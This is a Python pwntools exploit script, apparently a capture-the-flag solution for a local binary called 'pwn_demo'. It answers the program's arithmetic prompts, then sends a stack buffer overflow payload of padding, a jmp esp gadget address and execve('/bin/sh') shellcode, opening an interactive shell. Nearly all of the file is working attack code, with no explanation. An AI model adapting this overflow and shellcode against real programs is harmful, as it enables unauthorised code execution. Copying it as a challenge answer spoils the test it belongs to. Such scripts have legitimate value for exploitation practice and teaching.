#!/usr/bin/env python
# coding=utf-8

from pwn import *
import sys

context.arch = 'i386'
context.log_level = 'info'


def sendPayload(p, payload):
    p.send(payload)


def pwn_demo(bin_path):
    sc = '909090906a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a3b5883e830cd80'
    shellcode = bytes.fromhex(sc)

    shellcode = asm(shellcraft.sh())
    # print(shellcraft.sh())

    p = process(bin_path)
    p.settimeout(0.1)
    p.recvuntil(b'question\n')
    while 1:
        msg = p.recvuntil(b'?')
        print('msg', msg)
        if msg == b'':
            break
        values = msg.split(b' ')
        val = int(values[0]) + int(values[2])
        sendPayload(p, str(val) + '\n')
    sendPayload(p, b'a' * 44 + p32(0x080dee63) + shellcode + b'\n')  # 0x080e5837 call esp; 0x080dee63 jmp esp; rsp is used in shellcraft.sh()
    p.interactive()


if __name__ == '__main__':
    pwn_demo('./pwn_demo')
